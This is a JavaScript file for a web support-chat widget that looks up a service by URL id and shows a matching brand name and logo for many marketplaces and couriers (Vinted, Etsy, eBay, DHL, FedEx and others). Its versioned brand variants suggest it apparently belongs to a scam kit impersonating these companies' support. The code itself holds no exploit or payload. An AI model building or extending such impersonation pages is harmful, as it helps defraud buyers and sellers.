const messages = document.getElementById("chat-messages"),
      input = document.querySelector("#chat-input-text");
/////////////////////////////////////////////////////////

document.querySelector("#send_message_form").addEventListener("submit", (e) => {
  e.preventDefault();
  sendMessage();
});

document.querySelector("#chat-input-text").addEventListener("keypress", (e) => {
  if (e.keyCode == 13) {
    e.preventDefault();
    return sendMessage();
  }
});


async function getSupportData() {
  id = window.location.href.split('/')[6].split('=')[1]
  const res = await axios.get(`/api/getSupportData/${id}`)
  const service = res.data

  switch (service) {
    case 'Vinted':
      return `${service} | https://crosslist.com/wp-content/uploads/2022/04/vinted-logo-icon.png`
    case 'Idealista':
      return `${service} | https://play-lh.googleusercontent.com/jgtmOSf5u4UPnewWEVD76U0rfKLh7H4Rrz0rlCl0NGN6UP6DvjfypgGt7V69spUO_w`
    case 'Mobile':
      return `${service} | https://cdn6.aptoide.com/imgs/c/7/c/c7c417f19098168010ba10e611ba06d5_icon.png`
    case 'MobileV2':
      return `Mobile | https://cdn6.aptoide.com/imgs/c/7/c/c7c417f19098168010ba10e611ba06d5_icon.png`
    case 'Autoscout24':
      return `${service} | https://avatars.githubusercontent.com/u/60146476?s=280&v=4`
    case 'FiverrV2':
      return `Fiverr | https://freelogopng.com/images/all_img/1656739257fiverr-logo-transparent.png`
    case 'Wallapop':
      return `${service} | https://cdn6.aptoide.com/imgs/3/b/f/3bf07b5f0fead173b6dae491ad706d08_icon.png`
    case 'Shpock':
      return `${service} | https://images.crunchbase.com/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/lve7ryepoveybilfnnr2`
    case 'Etsy':
      return `${service} | https://cdn0.iconfinder.com/data/icons/miu-flat-social/58/etsy-512.png`
    case 'EtsyV2':
      return `Etsy | https://cdn0.iconfinder.com/data/icons/miu-flat-social/58/etsy-512.png`
    case 'Marktplaats':
      return `Marktplaats | https://seeklogo.com/images/M/marktplaats-nl-logo-141850EBF6-seeklogo.com.png`
    case 'Willhaben':
      return `${service} | https://upload.wikimedia.org/wikipedia/commons/thumb/d/d0/Logo_willhaben.png/640px-Logo_willhaben.png`
    case 'Ebay':
      return `${service} | https://cdn-icons-png.flaticon.com/512/217/217436.png`
    case 'Carousell':
      return `${service} | https://avatars.githubusercontent.com/u/3833591?s=280&v=4`
    case 'Booking':
      return `${service} | https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/Booking.com_Icon_2022.svg/2500px-Booking.com_Icon_2022.svg.png`
    case 'Depop':
      return `${service} | data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAb1BMVEX/IwAAAAD/NiP/KAxrDwC/GwC2GQCSFQDDGwDiHwDqIACPFACyGQCoFwD5IgBeDQDYHgAsBgCdFgDxIQBuDwB7EQCJEwBlDgBFCgA3CADLHACAEgBJCwAwBwBTDAAhBQBXDAAlBQA9CQAVAwAcBACBoK/5AAADK0lEQVR4nO3d2VIaURSF4aMh9MAozaBg1Ji8/zOGWLnIBUXvTbGHdWr9D7D1s+H0CJbHUnsU4kchfhTiRyF+FOJHIX4U4kchfhTiRyF+FOJHIX4U4kchfhTiRyF+FOJHIX4U4kchfhTiRyF+FOJHoXHfH4Td/iMoNI5CCgVRaByFFAqi0DgKKRREoXEUUiiIQuMopFAQhcZRSKEgCo2jkEJBFBpHIYWCKDSOQgoFUWhc/cIWUjisp5vT4fWH9JeHEg7t7O2usFzC4+ndRpdDeNza6RIIh5ktL1rYTcx9ocL+4OCLFO5dfHFC8Q4bVWi8foYL+99+wBDh0dEXIpy7AgOEC1+gv9B5C/oL/fYSQcLOHegt9Ac6C1e1C6cBQFfhMgLoKnQ8GI0RBqyjzsKIZcZVGLQJHYUx70JH4W0L6dNqt28uJv6DuQn1pxRvi+7KvHz3LV6Uvma4Pi/dvade59suxwamE+pepNPxgemEqp3hUTAwnVADnEsGZhNqdvcfoonZhJrzpl40MZtQcZPiIJuYTahYaFrZxGzCn3KhcGI2oRz4LJyYTKg47D4JRyYTKo7ZNsKRyYSK3aFod1/SCddyoeCQ9CtcYf3bcCEciSvcC0cmEypWmpVwZDKh5gxfODKZUHOh7drlp/9KJtScAM9kE7MJNVfaZBOzCTUXvBvRxGzCjUIoeydmE+oegxq5GPxVNqHyroXgUk02YfnUEcePv9MJG53w4XPsqnA6oeLI9F+/mvW1gfnuPd30SOnLdraYTy8mvj7pJlTtL+6Zm3CoXlj/fXztPVJAYdRGdBQGvRMdhUHLqaewPFUvDFlsXIX+D+q7C8uuemH5qF5YnqsXltfqhd7PCgcI3T4fGyf0/fBTiLAMjutNjNDzU4hRwrL02vmHCUvpav/GgXO9x3YMFZ5fqwvzM6pg4bmusUXGC8/1c8NrOCmEfxvazcRkY97+K5l819ewbueb2Wm3ndwr6dMrF+J/B8SPQvwoxI9C/CjEj0L8KMSPQvwoxI9C/CjEj0L8KMSPQvwoxI9C/CjEj0L8KMSPQvwoxI9C/CjEj0L8KMTv8Vvl/QG8ljocZ4lxRgAAAABJRU5ErkJggg==`
    case 'DHL':
      return `${service} | https://orion-partners.com/wp-content/uploads/05dhl.png`
    case 'DPD':
      return `${service} | https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/DPD_logo_%282015%29.svg/1280px-DPD_logo_%282015%29.svg.png`
    case 'Dubizzle':
      return `${service} | https://lh5.ggpht.com/Yasg3Qc67FruAHv16MwvXPn1dG93B4wVe1TxLwVnN-ADT-GgPt7cBm1NgW7XYsDu_A`
    case 'Anibis':
      return `${service} | data:image/png;base64,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`
    case 'FedEx':
      return `${service} | https://www.pngall.com/wp-content/uploads/13/Fedex-Logo-PNG-File.png`
    case 'Aramex':
      return `${service} | https://companyurlfinder.com/marketing/assets/img/logos/aramex.com.png`
    case 'Facebook':
      return `${service} | https://cdn3.iconfinder.com/data/icons/free-social-icons/67/facebook_circle_color-512.png`
    case 'Leboncoin':
      return `${service} | https://logos-world.net/wp-content/uploads/2022/05/Le-Bon-Coin-Emblem.png`
    case 'Milanuncios':
      return `${service} | data:image/png;base64,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`
    case 'Grailed':
      return `${service} | https://static.wikia.nocookie.net/logopedia/images/1/1f/Grailed_2016_%28Favicon%29.svg/revision/latest?cb=20221113031125`
    case 'Expedia':
      return `${service} | https://upload.wikimedia.org/wikipedia/commons/thumb/5/5f/Expedia_Icon_2022.svg/2048px-Expedia_Icon_2022.svg.png`
    case 'Postnord':
      return `${service} | data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAk1BMVEUAXZL///8AWpAAVo4AU4wAWZAAT4pFfaZBdaAAUYvT4+wAV49Dd6EAYJWyw9QATorr8/ff6/GVtcz1+vzH2eTO2OMlapp6ob4ARYWivNA0d6SXr8YAZJeDqMOKrcbj7PJVhqy/0uBhkbNvl7Yubpycus9znbvc4+pQhKqNp8C3x9aqxNYcZJa70N5jjbB/nbkAQIN+ZXF2AAAFhUlEQVR4nO3Y63KjNgAFYNAFAoQANoHg5RIwTlwbu33/p6tAEsY2aTuzeHa7e74fCQgQOohICoYBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwSyI/ugGPRDh1grz70c3oUWewcK08aVZxaNo/QS/S1WuvXrZWvjUHP0NCy5VtSRZtC/32mISEz1VI/rHw64Qz15HZumauWzQhHXCDUNo9tT6b1kkoM/Ik8Rnjl0IxBHBRmBueIy7TCXPWVyMu6InamJEkBvMmdXkO75LO98a6uLw1MTizLCqLmCeq5owtmLAriqIsV1urKz9Dcx0eN+OgQZykdKtwvQ7dzHbGTmvL16gvrD7r8uzrhGUqqtm15aq3tTaZuLByP8YBn+UftSgSV2VnMgTn76tUKFvrPXv93Hn9DfcHUXUYrfw/FktInmVV7n5tKgWThzzjaF7EMjm5KjTXeeBe7crf1YcuieTbS+hqfTmtOlt95oPcex9+u9Tw/FqfEb4ul/BJtW3SzsPwxtD9tExYiYi8Da/KXMuaJkw981bVV8aTz+vSo3iK7EWdMfyM2d0Nl014nUXcnzZ3xaJzWXV75jRhRf37ylJqkC68La3ZmFCKnXamJY9KaObEIPcP1NywdNyWh9/5NGEzlzC2jCCeC36T8G3mpMcl3DHnOFNcv53kRmV3fmeXdXiZLYQoIDMJzYDsZ0pD37lOONeFyyYsfbap1fbaynUXZrnTjsWd2ooTn1rMcYJLwrTZikFFJ1yXdhOp7dxSz0UMZ55R6PsVwZjQ3a2OZaajN8Tf6rsvmfAspgOu+8hMzmrjGIgXNlipvWbs2dA9pBvHuyQMvH65oBM2Fme6UzaGam8UiHnS0jW/vumETSCm0Dc1FoViZiQsWS+eMAr6PW6rm76Xutf6WxDdo7t3c8rdBmNCOWPrhL7YpqoTNxtd6TDV6wtc3YeH4daWOikdKnKyxRMe5WzXqftsVa99yrnRUg84e7v589w5usHeNGHYb3s6oeq1tZwa2e4mocxEVI374TF46eIJa+sq4Z86oewaPUlkdyNQo2d8Pk1YkWlCPdC0Q3N1DWPCD2+asBkqoguuafSMP6yJqX4Lz2pAWA+t4pv1+LiZnU3nxPhNJTSmCaO+mZ46Mr6lcrHkqcvHv0OZ0FEnrYZHHZwWTyiGFOY5hp6Zcx31tS8mekWy55RRhyT2x4s6Mwq+TEh1wnFcbi1KAz1m7nTC/ZAi0EOvHXg02OqdJWeL6NtW31zM0p7OGmbbTLew8miZ2Yb4j976K71J6H+dMKh1vae0HKdP29IJh/eSja//8SM9jSc9asZvOFvNFBfUcftVcVYUO/UEXP2W5l8npHMz/omxq4RkM3PSwxK6/br4bilp1o7B70KPCcmXCYlzur3MDHOiE8qxxZg56XEJ+2F9HF1GFSH8djkeGcF/SGjQuzWn7Y0rbznSGMS/f6YPSli1w0PlnXtVXIsM7GauiMQa5eorhk44DMzxmJDcXFjZ1LhNKJ7pJKK7eEK3VF22PvqqVuKl0XjH+Nx/3mDZ9DlHhUcuXzHkRepI/4zYJaHYsU/jOxGlfDiuEm7Hrxr5Ua/v9svPh+5bUpzi+GWbTD7UUP5UHOI4zrYtlc2gRtusXuq6fimb1uuXA6R97j0RVd2w1w7biTyimu90TSbqOhQ2l8sIQx5/njSGtUUdx8eG0E4e87874CWhJT8iedcPTX1ZmpRyMSU6oojq73JkMPaD3J0cGS8lvK/KoZe6ro9f7sdnj313wgUq+yn9Bgmff/WERvdt8Kf376f+X8kPz79wQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+F39DXriVkLtr6y6AAAAAElFTkSuQmCC`
    case 'Speedpost':
      return `${service} | https://mytrackcdn.com/images/couriers/speedpost.jpg.webp`
    case 'Singpost':
      return `${service} | data:image/png;base64,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